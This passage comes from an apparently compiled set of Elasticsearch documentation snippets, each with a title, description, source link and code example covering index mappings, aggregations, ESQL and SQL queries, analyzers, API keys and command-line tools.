ignored_field_values section.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-small\" : { \"type\" : \"keyword\", \"ignore_above\": 2 }, <1>\n      \"my-large\" : { \"type\" : \"keyword\" }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1?refresh=true\n{\n  \"my-small\": [\"ok\", \"bad\"], <2>\n  \"my-large\": \"ok content\"\n}\n\nPOST my-index-000001/_search\n{\n  \"fields\": [\"my-*\"],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Maximum Aggregation Buckets\nDESCRIPTION: Dynamic setting that limits the maximum number of aggregation buckets allowed in a single response. Default value is 65,536.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: properties\nCODE:\n```\nsearch.max_buckets\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_TIME Keyword in Elasticsearch SQL\nDESCRIPTION: Example showing how to use CURRENT_TIME as a keyword to get the current time with millisecond precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_TIME AS result;\n\n         result\n------------------------\n12:31:27.237Z\n```\n\n----------------------------------------\n\nTITLE: Literal Asterisk Interpretation in Elasticsearch EQL\nDESCRIPTION: Demonstrates that == and != operators do not expand wildcard characters in Elasticsearch EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_31\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name == \"cmd*.exe\"\n```\n\n----------------------------------------\n\nTITLE: Extracting Minimum Y Coordinate Using ST_YMIN in Elasticsearch ESQL\nDESCRIPTION: This ESQL query demonstrates the use of ST_YMIN along with other geometry functions to extract the minimum and maximum coordinates of an envelope around a city boundary. It filters for a specific airport, creates an envelope, and then extracts the coordinate boundaries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_ymin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Profiling Fetch Phase in Elasticsearch (Console)\nDESCRIPTION: Demonstrates how to execute a search query with profiling enabled to analyze the fetch phase. The query searches for documents with a specific user ID and returns the fetch profile information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?filter_path=profile.shards.fetch\n{\n  \"profile\": true,\n  \"query\": {\n    \"term\": {\n      \"user.id\": {\n        \"value\": \"elkbee\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing ICU Folding with Unicode Set Filter in Elasticsearch\nDESCRIPTION: This example shows how to customize the ICU folding token filter using the unicode_set_filter parameter. It creates an analyzer that exempts Swedish characters from folding and adds a lowercase filter to ensure proper case handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-folding.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"swedish_analyzer\": {\n            \"tokenizer\": \"icu_tokenizer\",\n            \"filter\": [\n              \"swedish_folding\",\n              \"lowercase\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"swedish_folding\": {\n            \"type\": \"icu_folding\",\n            \"unicode_set_filter\": \"[^åäöÅÄÖ]\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Various Types to Long Using TO_LONG Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TO_LONG function in ESQL to convert string and numeric values to long. It shows how different input types are handled, including strings representing numbers and potential non-numeric strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_long.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"2147483648\", str2 = \"2147483648.2\", str3 = \"foo\"\n| EVAL long1 = TO_LONG(str1), long2 = TO_LONG(str2), long3 = TO_LONG(str3)\n```\n\n----------------------------------------\n\nTITLE: Aggregating and Enriching Windows Event Logs with ESQL\nDESCRIPTION: This query aggregates Windows event logs, enriches them with event descriptions, and sorts the results. It filters, groups, and transforms the data to provide a summary of event occurrences by host and event code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-examples.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM logs-*\n| WHERE event.code IS NOT NULL\n| STATS event_code_count = COUNT(event.code) BY event.code,host.name\n| ENRICH win_events ON event.code WITH event_description\n| WHERE event_description IS NOT NULL and host.name IS NOT NULL\n| RENAME event_description AS event.description\n| SORT event_code_count DESC\n| KEEP event_code_count,event.code,host.name,event.description\n```\n\n----------------------------------------\n\nTITLE: Creating an index with constant_keyword field type in Elasticsearch\nDESCRIPTION: Demonstrates how to create an index with a constant_keyword field type that has a predefined value of 'debug' for all documents in the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT logs-debug\n{\n  \"mappings\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"message\": {\n        \"type\": \"text\"\n      },\n      \"level\": {\n        \"type\": \"constant_keyword\",\n        \"value\": \"debug\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Connector Config File with Curl\nDESCRIPTION: This command downloads the sample configuration file (config.yml.example) from the specified URL using curl and saves it to a local directory.  The user must replace the placeholder with the absolute path to the desired directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-docker.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output </absolute/path/to>/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Downloading Configuration File via Curl\nDESCRIPTION: Command to download the sample configuration file for the Confluence connector\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Using Table Alias in FROM Clause\nDESCRIPTION: Example of assigning an alias to a table in the FROM clause using the AS keyword, which hides the actual table name and must be used in its place.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT e.emp_no FROM emp AS e LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Using COUNT(DISTINCT) Function in Elasticsearch SQL\nDESCRIPTION: The COUNT(DISTINCT) function returns the total number of distinct non-null values in the input field, ignoring null values and counting unique values only.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nCOUNT(DISTINCT field_name) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(DISTINCT hire_date) unique_hires, COUNT(hire_date) AS hires FROM emp;\n\n  unique_hires  |     hires\n----------------+---------------\n99              |100\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(DISTINCT DATE_TRUNC('YEAR', hire_date)) unique_hires, COUNT(DATE_TRUNC('YEAR', hire_date)) AS hires FROM emp;\n\n unique_hires  |     hires\n---------------+---------------\n14             |100\n```\n\n----------------------------------------\n\nTITLE: Auto Date Histogram with Missing Value Handling in Elasticsearch\nDESCRIPTION: Example showing how to handle missing values in an auto date histogram aggregation. Documents without a value in the date field will be treated as if they had the specified default value ('2000/01/01').\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-autodatehistogram-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sale_date\": {\n      \"auto_date_histogram\": {\n        \"field\": \"date\",\n        \"buckets\": 10,\n        \"missing\": \"2000/01/01\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Processing Dates and Times in Painless Ingest Script\nDESCRIPTION: A Painless script that processes date and time strings from a document during ingestion. It parses date and time fields in various formats, converts them to a standard format, and stores the result as milliseconds in a datetime field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-ingest-processor-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nString[] dateSplit = ctx.date.splitOnToken(\"-\");                     <1>\nString year = dateSplit[0].trim();\nString month = dateSplit[1].trim();\n\nif (month.length() == 1) {                                           <2>\n    month = \"0\" + month;\n}\n\nString day = dateSplit[2].trim();\n\nif (day.length() == 1) {                                             <3>\n    day = \"0\" + day;\n}\n\nboolean pm = ctx.time.substring(ctx.time.length() - 2).equals(\"PM\"); <4>\nString[] timeSplit = ctx.time.substring(0,\n        ctx.time.length() - 2).splitOnToken(\":\");                    <5>\nint hours = Integer.parseInt(timeSplit[0].trim());\nint minutes = Integer.parseInt(timeSplit[1].trim());\n\nif (pm) {                                                            <6>\n    hours += 12;\n}\n\nString dts = year + \"-\" + month + \"-\" + day + \"T\" +\n        (hours < 10 ? \"0\" + hours : \"\" + hours) + \":\" +\n        (minutes < 10 ? \"0\" + minutes : \"\" + minutes) +\n        \":00+08:00\";                                                 <7>\n\nZonedDateTime dt = ZonedDateTime.parse(\n         dts, DateTimeFormatter.ISO_OFFSET_DATE_TIME);               <8>\nctx.datetime = dt.getLong(ChronoField.INSTANT_SECONDS)*1000L;        <9>\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Pattern Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to analyze text using the `pattern` analyzer in Elasticsearch. It sends a POST request to the `_analyze` endpoint, specifying the analyzer as `pattern` and providing the text to be analyzed. The response will contain the terms generated by the analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"pattern\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Field Metadata in Elasticsearch Mapping\nDESCRIPTION: This example demonstrates how to attach metadata to a field when creating an index mapping. The snippet creates an index with a 'latency' field of type 'long' and attaches metadata indicating the unit is milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-field-meta.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"latency\": {\n        \"type\": \"long\",\n        \"meta\": {\n          \"unit\": \"ms\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Elasticsearch Boosting Query\nDESCRIPTION: Demonstrates a boosting query that searches for 'apple' while reducing relevance for documents containing related terms like 'pie', 'tart', 'fruit', 'crumble', and 'tree'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-boosting-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"boosting\": {\n      \"positive\": {\n        \"term\": {\n          \"text\": \"apple\"\n        }\n      },\n      \"negative\": {\n        \"term\": {\n          \"text\": \"pie tart fruit crumble tree\"\n        }\n      },\n      \"negative_boost\": 0.5\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Enrollment Token for Elasticsearch Node\nDESCRIPTION: Example command to create an enrollment token for enrolling an Elasticsearch node into a cluster using the node scope.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/create-enrollment-token.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-create-enrollment-token -s node\n```\n\n----------------------------------------\n\nTITLE: Cardinality Aggregation with Missing Values\nDESCRIPTION: Example demonstrating how to handle missing values in cardinality aggregation using the missing parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cardinality-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"tag_cardinality\": {\n      \"cardinality\": {\n        \"field\": \"tag\",\n        \"missing\": \"N/A\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Max Aggregation for Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the 'missing' parameter in Max aggregation to handle documents with missing values. It assigns a default value of 10 to documents missing the 'grade' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-max-aggregation.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"aggs\" : {\n      \"grade_max\" : {\n          \"max\" : {\n              \"field\" : \"grade\",\n              \"missing\": 10\n          }\n      }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Italian Custom Analyzer Implementation\nDESCRIPTION: Demonstrates how to reimplement the built-in Italian analyzer with custom configurations including elision, stop words, keyword marking, and stemming filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nPUT /italian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"italian_elision\": {\n          \"type\": \"elision\",\n          \"articles\": [\n                \"c\", \"l\", \"all\", \"dall\", \"dell\",\n                \"nell\", \"sull\", \"coll\", \"pell\",\n                \"gl\", \"agl\", \"dagl\", \"degl\", \"negl\",\n                \"sugl\", \"un\", \"m\", \"t\", \"s\", \"v\", \"d\"\n          ],\n          \"articles_case\": true\n        },\n        \"italian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_italian_\"\n        },\n        \"italian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"esempio\"]\n        },\n        \"italian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"light_italian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_italian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"italian_elision\",\n            \"lowercase\",\n            \"italian_stop\",\n            \"italian_keywords\",\n            \"italian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Create Elasticsearch API Key with DLS\nDESCRIPTION: This console command creates an Elasticsearch API key with document-level security (DLS) and workflow restrictions. It uses the Create API Key API to restrict queries to a specific search application and to documents the user has access to based on the access control information. The API key will only allow querying documents that contain 'john@example.co' or 'Engineering Members' in the `_allow_access_control` field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_1\n\nLANGUAGE: Console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"john-api-key\",\n  \"expiration\": \"1d\",\n  \"role_descriptors\": {\n    \"sharepoint-online-role\": {\n      \"index\": [\n        {\n          \"names\": [\n            \"sharepoint-search-application\"\n          ],\n          \"privileges\": [\n            \"read\"\n          ],\n          \"query\": {\n            \"template\": {\n              \"params\": {\n                \"access_control\": [\n                  \"john@example.co\",\n                  \"Engineering Members\"\n                  ]\n              },\n              \"source\": \"\"\"\n              {\n                \"bool\": {\n                  \"should\": [\n                    {\n                      \"bool\": {\n                        \"must_not\": {\n                          \"exists\": {\n                            \"field\": \"_allow_access_control\"\n                          }\n                        }\n                      }\n                    },\n                    {\n                      \"terms\": {\n                        \"_allow_access_control.enum\": {{#toJson}}access_control{{/toJson}}\n                      }\n                    }\n                  ]\n                }\n              }\n              \"\"\"\n            }\n          }\n        }\n      ],\n      \"restriction\": {\n        \"workflows\": [\n          \"search_application_query\"\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting to Date Nanos and Filtering in ESQL\nDESCRIPTION: This ESQL query demonstrates the use of TO_DATE_NANOS function to convert a string timestamp to a nanosecond-resolution date value. It filters records based on both nanosecond and millisecond precision dates, then sorts the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_date_nanos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM date_nanos\n| WHERE MV_MIN(nanos) < TO_DATE_NANOS(\"2023-10-23T12:27:28.948Z\")\n    AND millis > \"2000-01-01\"\n| SORT nanos DESC\n```\n\n----------------------------------------\n\nTITLE: Converting Radians to Degrees Using TO_DEGREES in ESQL\nDESCRIPTION: Demonstrates using the TO_DEGREES function to convert a list of radian values to degrees. Creates a ROW with an array of radian values (1.57, 3.14, 4.71) and converts them to their equivalent degree values using the EVAL command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_degrees.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW rad = [1.57, 3.14, 4.71]\n| EVAL deg = TO_DEGREES(rad)\n```\n\n----------------------------------------\n\nTITLE: Creating Index for kNN Search Profiling in Elasticsearch (Console)\nDESCRIPTION: Sets up an index with dense vector fields for demonstrating kNN (k-Nearest Neighbors) search profiling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nPUT my-knn-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3,\n        \"index\": true,\n        \"similarity\": \"l2_norm\"\n      }\n    }\n  }\n}\n\nPOST my-knn-index/_bulk?refresh=true\n{ \"index\": { \"_id\": \"1\" } }\n{ \"my-vector\": [1, 5, -20] }\n{ \"index\": { \"_id\": \"2\" } }\n{ \"my-vector\": [42, 8, -15] }\n{ \"index\": { \"_id\": \"3\" } }\n{ \"my-vector\": [15, 11, 23] }\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Aggregate Function\nDESCRIPTION: Example of using GROUP BY with the COUNT aggregate function to count employees by gender group.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g, COUNT(*) AS c FROM emp GROUP BY gender;\n```\n\n----------------------------------------\n\nTITLE: Add files to the Elasticsearch keystore\nDESCRIPTION: Stores the binary contents of a file as a secure setting in the keystore, useful for managing certificates or key files. Supports multiple files in a single command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore add-file the.setting.name.to.set /path/example-file.json\n```\n\n----------------------------------------\n\nTITLE: Create MongoDB Connector using API\nDESCRIPTION: This snippet demonstrates how to create a MongoDB connector using the Elasticsearch Create connector API. It sets the index name, connector name, and service type. It requires an API key with specific cluster and index privileges to be created and configured.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n\"PUT _connector/my-mongodb-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from MongoDB\",\n  \"service_type\": \"mongodb\"\n}\"\n```\n\n----------------------------------------\n\nTITLE: Querying Employee Language Stats with ESQL\nDESCRIPTION: ESQL query that performs employee count aggregation grouped by number of languages known. Uses COUNT aggregation function with GROUP BY clause and sorts results by the languages field. Includes null handling for employees with no language data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/stats.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS count = COUNT(emp_no) BY languages\n| SORT languages\n```\n\n----------------------------------------\n\nTITLE: Updating Search Slow Log Settings for a Single Index\nDESCRIPTION: This snippet demonstrates how to update search slow log settings for a specific index using the Elasticsearch Update Indices Settings API. It sets thresholds for different log levels and enables user information inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001/_settings\n{\n  \"index.search.slowlog.threshold.query.warn\": \"10s\",\n  \"index.search.slowlog.threshold.query.info\": \"5s\",\n  \"index.search.slowlog.threshold.query.debug\": \"2s\",\n  \"index.search.slowlog.threshold.query.trace\": \"500ms\",\n  \"index.search.slowlog.threshold.fetch.warn\": \"1s\",\n  \"index.search.slowlog.threshold.fetch.info\": \"800ms\",\n  \"index.search.slowlog.threshold.fetch.debug\": \"500ms\",\n  \"index.search.slowlog.threshold.fetch.trace\": \"200ms\",\n  \"index.search.slowlog.include.user\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Aggregation Response in Elasticsearch\nDESCRIPTION: This snippet shows the response format for a Terms aggregation in Elasticsearch. It includes the doc_count_error_upper_bound, sum_other_doc_count, and buckets with keys and document counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"genres\": {\n      \"doc_count_error_upper_bound\": 0,\n      \"sum_other_doc_count\": 0,\n      \"buckets\": [\n        {\n          \"key\": \"electronic\",\n          \"doc_count\": 6\n        },\n        {\n          \"key\": \"rock\",\n          \"doc_count\": 3\n        },\n        {\n          \"key\": \"jazz\",\n          \"doc_count\": 2\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Well-Known Text for Geo-bounding Box\nDESCRIPTION: This example employs Well-Known Text (WKT) to define the bounding box for a geo_bounding_box query. The input is a WKT string format for spatial data, and matching documents intersecting the bounding box are the outputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"wkt\": \"BBOX (-74.1, -71.12, 40.73, 40.01)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Certificates to PKCS#12 Format\nDESCRIPTION: This snippet converts the generated certificates (cert1 and cert2) into PKCS#12 format, allowing for easier management and import into different keystores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n# 8. Convert Certs to PKCS#12\n\nfor Cert in cert1 cert2 \ndo\n    openssl pkcs12 -export -out $Cert/$Cert.p12 -inkey $Cert/$Cert.key -in $Cert/$Cert.crt -name $Cert -passout pass:p12-pass \ndone\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Mapping with Structured and Unstructured Fields in Elasticsearch\nDESCRIPTION: This snippet shows how to define index mappings that combine an annotated_text field for unstructured content with a structured field for entity references. The structured field includes a keyword sub-field to support aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-tips.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_unstructured_text_field\": {\n        \"type\": \"annotated_text\"\n      },\n      \"my_structured_people_field\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\" : {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Type Table Mapping Example\nDESCRIPTION: This demonstrates how to customize type mappings using an array, to avoid splitting on specific characters. The provided example maps the plus (`+`) and hyphen (`-`) characters as alphanumeric, which means they won’t be treated as delimiters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\n[ \"+ => ALPHA\", \"- => ALPHA\" ]\n```\n\n----------------------------------------\n\nTITLE: ESQL KEEP Query Example\nDESCRIPTION: Demonstrates using the KEEP clause in ESQL to retain all existing columns (*) along with explicitly keeping the first_name column. This ensures the first_name column appears in the output even if it might be excluded by other operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keepWildcardLowest.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP *, first_name\n```\n\n----------------------------------------\n\nTITLE: Creating Geo-distance Aggregation with Museums Example in Elasticsearch\nDESCRIPTION: This example creates a museums index with geo_point location data and demonstrates how to use geo-distance aggregation to create distance rings around Amsterdam.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geodistance-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"name\": \"Musée d'Orsay\"}\n\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"rings_around_amsterdam\": {\n      \"geo_distance\": {\n        \"field\": \"location\",\n        \"origin\": \"POINT (4.894 52.3760)\",\n        \"ranges\": [\n          { \"to\": 100000 },\n          { \"from\": 100000, \"to\": 300000 },\n          { \"from\": 300000 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Response from Stats Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows the expected response format from a stats aggregation. It includes the count of documents, minimum and maximum values, average, and sum of the aggregated field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-stats-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  ...\n\n  \"aggregations\": {\n    \"grades_stats\": {\n      \"count\": 2,\n      \"min\": 50.0,\n      \"max\": 100.0,\n      \"avg\": 75.0,\n      \"sum\": 150.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Logging delete_service_token Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the delete service account token event. This event is logged when the API is invoked to delete an index-based token for a service account.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2021-04-30T23:17:42,952+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\", \"event.\naction\":\"delete_service_token\", \"request.id\":\"az9a1Db5QrebDMacQ8yGKc\",\n\"delete\":{\"service_token\":{\"namespace\":\"elastic\",\"service\":\"fleet-server\",\"name\":\"token1\"}}}\n```\n\n----------------------------------------\n\nTITLE: Simulating Ingest Pipeline with Painless Script for Byte Conversion\nDESCRIPTION: This snippet demonstrates how to use the bytes processor in a Painless script within an ingest pipeline simulation. It converts a human-readable byte value to its numeric equivalent.\nSOURCE: 